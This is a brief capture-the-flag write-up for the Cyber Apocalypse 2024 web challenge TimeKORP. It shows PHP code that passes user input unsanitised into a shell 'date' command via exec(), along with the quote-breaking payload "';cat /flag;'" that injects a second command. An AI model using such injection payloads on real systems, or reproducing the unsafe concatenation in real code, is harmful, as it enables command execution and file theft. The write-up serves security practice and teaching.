---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | TimeKORP Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: web
challenge: TimeKORP
tags: "web, twh, rce"
date: 2024-03-16T00:00:00+00:00
last_modified_at: 2024-03-16T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2024</h1>

## TimeKORP
> Solved By : thewhiteh4t


- TimeModel.php is vulnerable

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

- specifically :

```
$this->command = "date '+" . $format . "' 2>&1";
```

- we just need to match single quotes and insert cat command in between so payload becomes :

```bash
';cat /flag;'
```

![](https://i.imgur.com/BhQqnTJ.png)

